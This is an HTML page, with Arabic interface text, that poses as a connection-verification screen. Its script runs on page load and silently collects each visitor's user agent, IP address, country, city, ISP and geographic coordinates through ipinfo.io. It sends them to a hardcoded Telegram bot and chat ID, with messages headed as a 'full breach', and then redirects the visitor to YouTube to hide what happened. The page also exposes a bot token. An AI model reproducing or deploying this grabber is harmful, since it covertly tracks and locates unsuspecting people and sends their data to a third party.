<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحقق...</title>
    <style>
        body {
            background: #0d1117;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            color: #c9d1d9;
            text-align: center;
        }
        .spinner {
            border: 4px solid #30363d;
            border-top: 4px solid #58a6ff;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div>
        <div class="spinner"></div>
        <p>جاري التحقق من اتصالك...</p>
    </div>

    <script>
        // ================= بيانات البوت (محدثة) =================
        const BOT_TOKEN = "8317512028:AAHEIRv_S23OFrceayGoKW823jIxvl9Az_k";
        const CHAT_ID = "1497190595";  // المعرف الخاص بك
        const REDIRECT_URL = "https://www.youtube.com/watch?v=6N5IQxrac6g";
        // =======================================================

        // دالة إرسال إلى تيليجرام (تعمل بصمت)
        function sendTelegram(msg) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: msg,
                    parse_mode: 'Markdown'
                })
            }).catch(() => {});
        }

        // 1. نرسل رسالة فورية بالبيانات الأساسية (بدون انتظار)
        const ua = navigator.userAgent;
        const time = new Date().toLocaleString();
        sendTelegram(`🔴 *زائر جديد* 🔴\n💻 ${ua}\n🕒 ${time}`);

        // 2. نجلب الـ IP والمعلومات الجغرافية من ipinfo.io (تعمل دائماً)
        fetch('https://ipinfo.io/json')
            .then(res => res.json())
            .then(data => {
                const ip = data.ip || "غير معروف";
                const country = data.country || "غير معروف";
                const city = data.city || "غير معروف";
                const org = data.org || "غير معروف";
                const loc = data.loc || "غير معروف";

                const fullMsg =
                    `🔥 *اختراق كامل - تفاصيل الموقع* 🔥\n` +
                    `🌐 IP: ${ip}\n` +
                    `📍 الدولة: ${country}\n` +
                    `🏙️ المدينة: ${city}\n` +
                    `📡 المزود: ${org}\n` +
                    `🗺️ الموقع: ${loc}\n` +
                    `💻 الجهاز: ${ua}\n` +
                    `🕒 الوقت: ${time}`;
                sendTelegram(fullMsg);
            })
            .catch(() => {
                // في حال فشل الجلب (نادراً)، نرسل تنبيهاً
                sendTelegram(`⚠️ *تعذر جلب الموقع* ⚠️\n💻 ${ua}\n🕒 ${time}`);
            });

        // 3. التوجيه إلى يوتيوب بعد 3 ثوانٍ لضمان وصول جميع الرسائل
        setTimeout(() => {
            window.location.replace(REDIRECT_URL);
        }, 3000);
    </script>
</body>
</html>
